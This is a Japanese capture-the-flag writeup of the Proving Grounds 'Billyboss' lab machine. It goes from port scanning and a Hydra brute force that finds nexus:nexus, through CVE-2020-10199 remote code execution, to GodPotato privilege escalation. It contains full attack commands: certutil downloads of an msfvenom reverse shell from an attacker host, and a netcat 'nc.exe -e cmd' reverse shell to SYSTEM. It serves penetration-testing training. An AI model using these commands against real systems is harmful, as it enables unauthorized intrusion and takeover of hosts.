+++
title = "Proving Grounds Practice - Billyboss Writeup"
date = "2026-10-25"
description = "Nexus Repository Managerの弱い認証情報を発見し、CVE-2020-10199によるRCEとGodPotatoを利用してNT AUTHORITY\\SYSTEMを取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Billyboss]", "[Nexus Repository Manager]", "[CVE-2020-10199]", "[RCE]", "[GodPotato]", "[SeImpersonatePrivilege]", "[Hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Billyboss |
| OS | Windows |
| Difficulty | Hard |
| Target IP | 192.168.178.61 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートのスキャンとサービス検出、デフォルトスクリプトを実行する。

```bash
nmap -sV -sC -p- 192.168.178.61
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8081/tcp  open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
| http-robots.txt: 2 disallowed entries
|_/repository/ /service/
|_http-title: Nexus Repository Manager
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

ポート21ではMicrosoft FTP Service、ポート80ではMicrosoft IIS 10.0、ポート8081ではSonatype Nexus Repository Managerが稼働している。

特に注目すべきなのは、ポート8081で稼働しているNexus Repository Manager 3.21.0-05である。

また、ポート80ではBaGetのタイトルが確認できた。

今回の攻略では、Nexus Repository Managerの認証情報を発見し、既知の脆弱性を利用して初期侵入を試みる。

---

## Enumeration

### Port 8081 - Nexus Repository Manager

ブラウザでポート8081にアクセスすると、Nexus Repository Managerのログイン画面が表示される。

```text
http://192.168.178.61:8081/
```

Nmapの結果から、以下の情報が得られている。

- 製品: Sonatype Nexus Repository Manager
- バージョン: 3.21.0-05
- Webサーバー: Jetty 9.4.18.v20190429

まず、Gobusterで公開されているディレクトリやファイルを調査する。

```bash
gobuster dir -u http://192.168.178.61:8081/ \
-w /usr/share/wordlists/dirb/common.txt
```

結果は以下のとおり。

```text
favicon.ico          (Status: 200) [Size: 3774]
index.html           (Status: 302) [Size: 0] [--> http://192.168.178.61:8081]
robots.txt           (Status: 200) [Size: 66]
```

`robots.txt` には、以下のパスが記載されていた。

```text
/repository/
/service/
```

これらはNexusのリポジトリ機能やAPIに関連するパスである。

一般的なディレクトリ列挙では有用な追加情報が得られなかったため、次に認証情報の調査へ進む。

### Port 80 - IIS / BaGet

ポート80についてもGobusterで調査する。

```bash
gobuster dir -u http://192.168.178.61/ \
-w /usr/share/wordlists/dirb/common.txt \
--exclude-length 2166
```

結果では、`favicon.ico` 以外に有用なパスは見つからなかった。

```text
favicon.ico          (Status: 200) [Size: 15086]
```

このサービスからは、今回の初期侵入につながる情報を得られなかった。

### FTP Enumeration

次に、FTPサービスでAnonymousログインを試みる。

```bash
ftp 192.168.178.61
```

```text
220 Microsoft FTP Service
Name (192.168.178.61:kali): anonymous
534 Policy requires SSL.
ftp: Login failed
```

Anonymousログインは拒否された。

この応答から、FTPサーバーがSSL/TLSを要求していることが分かる。匿名アクセスの可否を調べるだけでは有効な情報が得られなかったため、別のサービスを優先する。

### SMB Enumeration

続いて、SMBの匿名接続を試みる。

```bash
smbclient -L //192.168.178.61/ -N
```

```text
session setup failed: NT_STATUS_ACCESS_DENIED
```

匿名セッションは拒否されたため、SMBの共有一覧から直接情報を取得することはできなかった。

ここまでの結果から、認証情報を必要とするNexus Repository Managerが最も有望な調査対象となった。

### Credential Discovery with CeWL

NexusのWebページから、認証情報の候補となる単語を収集する。

CeWLを利用して、ページ内の単語からカスタムワードリストを作成する。

```bash
cewl http://192.168.178.61:8081/ -d 3 -m 5 -w wordlist-asis.txt
```

小文字に変換したワードリストも作成する。

```bash
cewl http://192.168.178.61:8081/ -d 3 -m 5 \
--lowercase -w wordlist-lower.txt
```

さらに、元のワードリストから大文字の候補を作成する。

```bash
tr '[:lower:]' '[:upper:]' \
< wordlist-asis.txt > wordlist-upper.txt
```

作成した3つのファイルを統合し、重複する単語を取り除く。

```bash
cat wordlist-asis.txt wordlist-lower.txt wordlist-upper.txt \
| sort -u > wordlist-all.txt
```

生成されたワードリストには、次のような単語が含まれていた。

```text
BROWSE
Browse
HISTORY
MANAGER
NEXUS
PRODUCT
RAPTURE
REPOSITORY
RESOURCES
STATIC
browse
manager
nexus
repository
```

Nexusの製品名や画面内の用語が中心となっているため、これらをユーザー名・パスワード候補として認証テストに利用する。

### Credential Attack with Hydra

Nexusのログインエンドポイントに対して、Hydraで認証テストを実施する。

```bash
hydra -I -f \
-L wordlist-all.txt \
-P wordlist-all.txt \
'http-post-form://192.168.178.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```

ここでは、CeWLで作成したワードリストをユーザー名とパスワードの両方に使用した。

実行結果は以下のとおり。

```text
[8081][http-post-form] host: 192.168.178.61
login: nexus
password: nexus
[STATUS] attack finished for 192.168.178.61 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

有効な認証情報として、次の組み合わせを発見した。

| Field | Value |
|-------|-------|
| Username | `nexus` |
| Password | `nexus` |

この認証情報を使えばNexusにログインできる。

今回の初期侵入の重要なポイントは、Webページから生成した単語リストを用いて認証テストを実施し、弱い認証情報を特定できたことである。

---

## Exploitation

### Vulnerability Research - CVE-2020-10199

Nexus Repository Managerのバージョンと発見した認証情報をもとに、既知の脆弱性を調査する。

SearchSploitでSonatype関連のエクスプロイトを検索する。

```bash
searchsploit sonatype
```

結果には、次のエントリが含まれていた。

```text
Exploit Title
-----------------------------------------------------------
Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)
Sonatype Nexus Repository 3.53.0-01 - Path Traversal
```

今回の対象はNexus Repository Manager 3.21.0-05であり、認証情報も判明している。そのため、認証後のリモートコード実行（Authenticated RCE）に注目する。

対象のエクスプロイトは以下のとおり。

- Exploit-DB: [49385 - Sonatype Nexus 3.21.1 RCE](https://www.exploit-db.com/exploits/49385)
- CVE: CVE-2020-10199

この脆弱性は、Nexus Repository Managerの特定のバージョンにおいて、認証済みユーザーが細工したリクエストを送ることで、Java Expression Language（EL）インジェクションを通じてOSコマンドを実行できるというものだ。

認証情報を必要とする脆弱性だが、今回の環境では `nexus:nexus` という認証情報を取得できているため、エクスプロイトの実行条件を満たしている。

### Preparing the Exploit

SearchSploitからエクスプロイトをローカルにコピーする。

```bash
searchsploit -m java/webapps/49385.py
```

取得したPythonスクリプトを編集し、対象URL、認証情報、実行するコマンドを設定する。

初期侵入に使用する設定は以下のとおり。

```python
URL = 'http://192.168.178.61:8081'
USERNAME = 'nexus'
PASSWORD = 'nexus'
```

続いて、攻撃者側で用意した実行ファイルを対象ホストにダウンロードさせるコマンドを指定する。

```python
CMD = 'certutil.exe -urlcache -f http://192.168.45.234:8000/shell.exe shell.exe'
```

ここで使用しているIPアドレスとポートは、実際の攻略環境に合わせたものである。

- `192.168.178.61:8081`: 対象のNexus Repository Manager
- `192.168.45.234:8000`: 攻撃者側のHTTPサーバー
- `shell.exe`: 対象ホストに転送するリバースシェルの実行ファイル

`certutil.exe` はWindowsに標準搭載されているツールであり、URLからファイルを取得する用途にも利用できる。

### Generating the Reverse Shell Payload

攻撃者側でWindows用のリバースシェルペイロードを生成する。

```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=192.168.45.234 \
LPORT=4444 \
-f exe \
-o shell.exe
```

生成した `shell.exe` をHTTP経由で対象ホストに転送できるよう、Kali側でWebサーバーを起動する。

```bash
python3 -m http.server 8000
```

別のターミナルで、リバース接続を待ち受ける。

```bash
nc -lvnp 4444
```

### Executing the RCE Exploit

まず、Pythonスクリプトに設定したダウンロードコマンドを実行する。

```bash
python3 49385.py
```

結果は以下のとおり。

```text
Logging in
Logged in successfully
Command executed
```

Nexusへのログインに成功し、指定したコマンドが実行されたことを確認できた。

続いて、スクリプト内の `CMD` をダウンロード済みの実行ファイルを起動するコマンドに変更する。

```python
URL = 'http://192.168.178.61:8081'
CMD = 'shell.exe'
USERNAME = 'nexus'
PASSWORD = 'nexus'
```

再びエクスプロイトを実行する。

```bash
python3 49385.py
```

```text
Logging in
Logged in successfully
Command executed
```

### Obtaining the Initial Shell

Kali側のリスナーで、対象ホストからの接続を確認する。

```text
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.234] from (UNKNOWN) [192.168.178.61] 50245
```

接続後、Windowsのコマンドプロンプトが表示された。

```text
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\nathan\Nexus\nexus-3.21.0-05>
```

これにより、Nexus Repository ManagerのRCEを利用して対象ホスト上でコマンドを実行し、リバースシェルを取得できた。

シェルのカレントディレクトリから、初期アクセス時の実行環境は次の場所であることが分かる。

```text
C:\Users\nathan\Nexus\nexus-3.21.0-05>
```

ここから、Windowsのローカル権限を調査し、SYSTEM権限への昇格を試みる。

---

## Privilege Escalation

### Transferring GodPotato

初期シェルを取得した段階では、対象ホスト上の高権限コンテキストを利用できているとは限らない。

Windowsでは、`SeImpersonatePrivilege` などの権限が有効なプロセスを足掛かりに、特権トークンの偽装を悪用する「Potato」系の手法でSYSTEM権限を取得できる場合がある。

今回の攻略では、GodPotatoを使用する。

GodPotatoは、Windowsの認証・偽装機構を悪用して、条件が整った環境で指定したコマンドを高い権限で実行するためのツールである。

Kali側で公開ディレクトリから取得した実行ファイルと、NetcatのWindows版をHTTPサーバーで配布する。

```bash
python3 -m http.server 8000
```

対象ホストの取得済みシェルから、以下のコマンドを実行する。

```cmd
certutil.exe -urlcache -f http://192.168.45.234:8000/GodPotato-NET4.exe GodPotato.exe
certutil.exe -urlcache -f http://192.168.45.234:8000/nc.exe nc.exe
```

これにより、対象ホストのカレントディレクトリに次のファイルが配置される。

```text
GodPotato.exe
nc.exe
```

### Testing GodPotato

```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
```

GodPotato経由でNetcatを起動し、攻撃者側へ新しいリバースシェルを接続する。

```cmd
.\GodPotato.exe -cmd "nc.exe -e cmd 192.168.45.234 4445"
```

### Obtaining the SYSTEM Shell

Kali側でポート4445の接続を待ち受ける。

```bash
nc -lvnp 4445
```

実行結果は以下のとおり。

```text
listening on [any] 4445 ...
connect to [192.168.45.234] from (UNKNOWN) [192.168.178.61] 50258
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
---

## Summary

Billybossでは、複数のサービスを列挙した後、ポート8081で稼働しているNexus Repository Managerに注目した。

CeWLで生成したワードリストをHydraで利用し、`nexus:nexus` という認証情報を発見した。対象のNexusはCVE-2020-10199の影響を受けるバージョンであり、公開されているPythonエクスプロイトを利用することで、認証後のリモートコード実行を実現した。

その後、Windows用のリバースシェルを転送・実行し、初期シェルを取得した。さらにGodPotatoとNetcatを利用して別のシェルを確立し、SYSTEM権限への昇格を試みた。

攻略の流れは以下のとおり。

1. Nmapによる全TCPポートのスキャンとサービス列挙
2. FTP、SMB、IISの調査
3. CeWLを利用したカスタムワードリストの作成
4. HydraによるNexus Repository Managerの認証テスト
5. `nexus:nexus` の発見
6. CVE-2020-10199を利用した認証後RCE
7. `shell.exe` による初期リバースシェルの取得
8. GodPotatoとNetcatの転送
9. GodPotato経由で新しいリバースシェルを取得

---

